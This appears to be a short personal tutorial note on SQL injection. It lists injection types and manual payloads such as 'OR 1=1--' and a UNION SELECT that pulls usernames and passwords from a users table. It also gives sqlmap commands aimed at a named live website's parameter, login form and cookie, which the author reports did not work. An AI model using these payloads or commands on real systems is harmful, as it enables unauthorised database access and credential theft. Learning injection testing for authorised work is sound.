# Sql injection

 It means attacker can access website's database using query related with perticular database.Mostly I used sqlmap tool for that
purpose.

 Types of sql injection:
1)error based sql injection 2) union based sql injection
3) boolean based sql injection 4) time based sql injection
<html>
  <head> sql injection</head>
  <body> <img src="https://avinetworks.com/wp-content/uploads/2020/04/sql-injection-attack-diagram.png" > </img>
  </body>
  </html>
  
# Steps

  Manual way:
  
   1) Add OR 1=1-- this with parameter value, It gives true result always if parameter value             is wrong also. If this work, then there might be sql injection.
    
   2) For retrive the data use query like " ' UNION SELECT username, password FROM users-- "
      with parameter value.

   3) This are different for different database, For more information reffer            https://portswigger.net/web-security/sql-injection/cheat-sheet
   
   Automate way:
 
  1) First install sqlmap.py from https://github.com/sqlmapproject/sqlmap .
  2) visit http://magnus.jalatechnologies.com/bundles/styles?v=lPGPuSt_xKxNmptTCKJ8QNFrLXCkhCS7B-5FH-7RYpA1.
  3) Perform sql injectionfrom parameter v.
  4) python3 sqlmap.py -u "http://magnus.jalatechnologies.com/bundles/styles?v=lPGPuSt_xKxNmptTCKJ8QNFrLXCkhCS7B-5FH-7RYpA1*" -p v
  5)Not found anything, then try for post request,In username and password parameter.
  6) python3 sqlmap.py -u "http://magnus.jalatechnologies.com//Account/Login" --data "UserName=*&Password=*"
  7) Not found anything,Try in http header.
  8) python3 sqlmap.py -u http://magnus.jalatechnologies.com/ --cookie "Cookie=*"
  9) It also not working.
